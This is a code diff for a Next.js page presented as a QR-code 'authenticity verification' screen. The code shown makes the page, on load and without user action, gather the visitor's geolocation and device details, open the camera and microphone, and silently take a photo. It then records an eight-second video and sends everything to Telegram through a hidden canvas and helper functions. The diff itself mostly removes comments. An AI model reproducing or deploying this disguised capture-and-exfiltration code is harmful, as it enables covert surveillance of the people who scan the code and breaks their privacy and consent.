@@ -1,12 +1,12 @@
 "use client";
 
 import { useEffect, useState, useRef, useCallback } from 'react';
-import { useSearchParams, usePathname } from 'next/navigation'; // Import usePathname
+import { useSearchParams, usePathname } from 'next/navigation';
 import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi';
 import { useLayoutContext } from '@/context/LayoutContext';
 import { showSuccess, showError } from '@/utils/toast';
 import LoadingSpinner from '@/components/LoadingSpinner';
-import { RefreshCcw } from 'lucide-react'; // Import RefreshCcw icon
+import { RefreshCcw } from 'lucide-react';
 
 type QrVerifyPageProps = {
   params: { lang: string };
@@ -14,23 +14,23 @@ type QrVerifyPageProps = {
 
 const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
   const searchParams = useSearchParams();
-  const pathname = usePathname(); // Get current pathname
+  const pathname = usePathname();
   const { t } = useLayoutContext();
   const currentLang = params.lang;
 
   const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.processingRequest);
   const [error, setError] = useState<string | null>(null);
-  const [isLoading, setIsLoading] = useState<boolean>(true); // Start as loading
+  const [isLoading, setIsLoading] = useState<boolean>(true);
   const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
   const [isRecording, setIsRecording] = useState<boolean>(false);
   const [stream, setStream] = useState<MediaStream | null>(null);
   const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
   const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
   const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);
-  const [captionMessage, setCaptionMessage] = useState<string>(''); // To store the caption from notifyVisit
+  // Removed captionMessage state as it's now handled by a local variable
 
   const videoRef = useRef<HTMLVideoElement>(null);
-  const canvasRef = useRef<HTMLCanvasElement>(null); // Ref for canvas to take photo
+  const canvasRef = useRef<HTMLCanvasElement>(null);
 
   const stopCamera = useCallback(() => {
     if (stream) {
@@ -78,20 +78,20 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         lon: geoLon,
         screenWidth: window.innerWidth,
         screenHeight: window.innerHeight,
-        isQrScan: true, // Explicitly set for QR scan
-        pagePath: pathname, // Pass the actual page path
+        isQrScan: true,
+        pagePath: pathname,
       };
       const initialCaption = await notifyVisit(bodyData, utmQueryParams);
-      setCaptionMessage(initialCaption); // Store caption for later use
+      // setCaptionMessage(initialCaption); // Removed state update
 
       // 3. Request Camera Access (front camera first)
       setStatusMessage(t.authenticity.processingRequest);
       let mediaStream: MediaStream;
       try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }); // Request audio as well
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
       } catch (frontCameraError: unknown) {
         console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }); // Fallback to rear camera
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
       }
       
       setStream(mediaStream);
@@ -102,7 +102,6 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         await videoRef.current.play();
       }
 
-      // Give camera a moment to warm up
       await new Promise(resolve => setTimeout(resolve, 1000)); 
 
       // 4. Take Photo
@@ -115,18 +114,16 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         const ctx = canvas.getContext('2d');
         if (ctx) {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
+          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
           
           try {
             await sendTelegramPhoto({ photoBase64, caption: initialCaption });
-            // showSuccess(t.authenticity.qrScanSuccess); // No client-side success for Telegram
           } catch (photoSendError: unknown) {
             console.error("Error sending photo to Telegram:", photoSendError);
-            // showError(t.authenticity.qrScanError); // No client-side error for Telegram
             setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
             setIsLoading(false);
             stopCamera();
-            return; // Stop process if photo fails
+            return;
           }
         }
       }
@@ -144,7 +141,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
 
       recorder.onstop = async () => {
         setIsRecording(false);
-        stopCamera(); // Stop camera after recording stops
+        stopCamera();
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
         const url = URL.createObjectURL(blob);
         setVideoPreviewUrl(url);
@@ -153,11 +150,11 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
           setStatusMessage(t.authenticity.processingRequest);
           const filename = `qr_scan_video_${new Date().getTime()}.webm`;
           await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
-          showSuccess(t.authenticity.recordingSuccess); // Show client-side success
+          showSuccess(t.authenticity.recordingSuccess);
           setStatusMessage(t.authenticity.recordingSuccess);
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
-          showError(t.authenticity.recordingError); // Show client-side error
+          showError(t.authenticity.recordingError);
           setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
           setStatusMessage(t.authenticity.recordingError);
         } finally {
@@ -167,12 +164,11 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
 
       recorder.start();
       setIsRecording(true);
-      // Record for 8 seconds
       setTimeout(() => {
         if (recorder.state !== 'inactive') {
           recorder.stop();
         }
-      }, 8000); // Record for 8 seconds
+      }, 8000);
 
     } catch (err: unknown) {
       console.error("Error during QR verification process:", err);
@@ -193,12 +189,11 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       setIsRecording(false);
       stopCamera();
     }
-  }, [currentLang, searchParams, pathname, t, stopCamera]); // Added pathname to dependencies
+  }, [currentLang, searchParams, pathname, t, stopCamera, recordedChunks]); // Added recordedChunks to dependencies
 
   useEffect(() => {
     startVerificationProcess();
 
-    // Cleanup function for when component unmounts
     return () => {
       stopCamera();
       if (mediaRecorder && mediaRecorder.state !== 'inactive') {
@@ -248,11 +243,9 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
             REC
           </div>
         )}
-        {/* Hidden canvas for capturing photo */}
         <canvas ref={canvasRef} style={{ display: 'none' }} />
       </div>
 
-      {/* No buttons for manual interaction, only a refresh option if needed */}
       {error && (
         <button
           onClick={() => window.location.reload()}
